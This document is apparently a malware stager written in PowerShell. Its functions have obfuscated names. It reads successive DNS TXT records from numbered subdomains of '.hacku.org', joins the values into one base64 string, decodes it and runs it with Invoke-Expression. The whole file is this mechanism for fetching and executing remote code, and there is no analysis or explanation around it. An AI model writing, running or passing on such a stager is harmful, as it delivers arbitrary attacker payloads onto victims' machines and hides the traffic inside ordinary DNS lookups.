$Domain = '.hacku.org'
function R2V0LUNDbWQ($i)
{
	$result = (nslookup -q=txt -timeout=%d $i$Domain) | out-string
	$x = ''
	if ($result.Contains('"'))
	{
		$x = ([regex]::Match($result,'(?<=")[^"]*(?=")').Value)
	}
	return $x
}
function R2V0LVJhbmRvbQ()
{
	$number = get-random -maximum 30 -minimum 1
	return $number
}
function AGKWSWFKGUEGCFVOCIZAQJUPZIEHFU($sec)
{
	Start-Sleep -Seconds $sec
}
$stage = ''
for($i=1;; $i ++)
{
	$x = R2V0LUNDbWQ $i
	if ($x.length -lt 1)
	{
		break
	}
	$stage += $x
}

function cvt-b64-str( $b64 )
{
	return [System.Text.Encoding]::Utf8.GetString([System.Convert]::FromBase64String($b64))
}
IEX (cvt-b64-str $stage)